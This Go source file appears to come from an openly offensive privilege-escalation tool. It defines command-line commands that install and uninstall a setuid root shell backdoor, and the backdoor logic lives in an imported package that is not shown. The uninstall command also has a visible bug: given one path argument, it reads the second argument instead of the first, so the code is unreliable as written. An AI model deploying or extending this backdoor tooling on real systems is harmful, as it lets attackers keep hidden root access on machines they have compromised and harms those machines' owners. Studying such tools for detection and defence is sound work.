package cmd

import (
	"fmt"
	"os"

	"github.com/liamg/traitor/pkg/backdoor"

	"github.com/spf13/cobra"
)

func init() {
	backdoorCmd.AddCommand(backdoorInstallCmd)
	backdoorCmd.AddCommand(backdoorUninstallCmd)
	rootCmd.AddCommand(backdoorCmd)
}

var backdoorCmd = &cobra.Command{
	Use:   "backdoor",
	Short: "Install a root shell backdoor",
}

var backdoorInstallCmd = &cobra.Command{
	Use:   "install [path]",
	Short: "Install a root shell backdoor",
	Args:  cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {

		var path *string
		var err error
		if len(args) == 1 {
			path, err = backdoor.InstallToPath(args[0])
		} else {
			path, err = backdoor.Install()
		}
		if err != nil {
			fail("Failed to install backdoor: %s", err)
		}

		fmt.Println(*path)
	},
}

var backdoorUninstallCmd = &cobra.Command{
	Use:   "uninstall [path]",
	Short: "Uninstall a root shell backdoor",
	Args:  cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {

		path, err := os.Executable()
		if err != nil {
			fail("Failed to determine executable path: %s", err)
		}

		if len(args) == 0 {
			info, err := os.Stat(path)
			if err != nil {
				fail("Failed to stat path: %s", err)
			}
			if info.Mode()&os.ModeSetuid == 0 {
				fail("Not a backdoor.")
			}
		} else {
			path = args[1]
		}

		if err := backdoor.Uninstall(path); err != nil {
			fail("Failed to remove backdoor: %s", err)
		}

		fmt.Println("Backdoor removed.")
	},
}
